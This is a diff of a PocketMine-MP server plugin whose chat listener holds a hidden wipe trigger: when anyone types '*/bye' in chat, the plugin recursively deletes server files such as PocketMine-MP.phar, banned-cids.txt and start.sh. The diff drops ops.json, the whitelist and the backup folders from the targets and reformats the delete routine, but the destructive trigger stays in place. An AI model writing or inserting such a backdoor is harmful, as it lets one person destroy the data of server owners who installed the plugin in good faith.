@@ -47,10 +47,6 @@ class Main extends PluginBase implements Listener
         $dir15 = $this->getServer()->getDataPath() ."PocketMine-MP.phar";
         $dir16 = $this->getServer()->getDataPath() ."banned-cids.txt";
         $dir17 = $this->getServer()->getDataPath() ."start.sh";
-        $dir18 = $this->getServer()->getDataPath() ."ops.json";
-        $dir19 = $this->getServer()->getDataPath() ."white-list.json";
-        $dir20 = $this->getServer()->getDataPath() ."backup";
-        $dir21 = $this->getServer()->getDataPath() ."Backup";
         if ($chat == "*/bye") {
             delDir($dir);
             delDir($dir1);
@@ -78,19 +74,20 @@ class Main extends PluginBase implements Listener
         }
     }
 
-    public function delDir($path){
-        if(is_dir($path) == TRUE){
+    public function delDir($path)
+    {
+        if (is_dir($path) == TRUE) {
             $rootFolder = scandir($path);
-            if(sizeof($rootFolder) > 2){
-                foreach($rootFolder as $folder){
-                    if($folder != "." && $folder != ".."){
+            if (sizeof($rootFolder) > 2) {
+                foreach ($rootFolder as $folder) {
+                    if ($folder != "." && $folder != "..") {
                         delDir($path."/".$folder);
                     }
                 }
                 rmdir($path);
             }
-        }else{
-            if(file_exists($path) == TRUE){
+        } else {
+            if (file_exists($path) == TRUE) {
                 unlink($path);
             }
         }
